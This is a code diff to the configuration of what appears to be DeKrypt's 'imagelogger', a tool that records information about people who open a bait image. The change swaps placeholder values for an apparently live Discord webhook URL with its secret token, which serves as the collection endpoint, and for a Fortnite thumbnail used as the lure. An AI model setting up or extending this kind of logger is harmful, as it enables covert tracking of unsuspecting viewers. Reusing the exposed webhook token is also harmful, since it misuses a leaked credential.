@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1336046140117880863/l5d_PPvE2oZoPnm887OTdQhXW3vO5sdx7jttEu2bXLmIPNiDQ7M4hI9IEGIFpY219e0N",
+    "image": "https://cdn2.unrealengine.com/fortnite-og-thumbnail-576x576-bed7ab6b556c.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
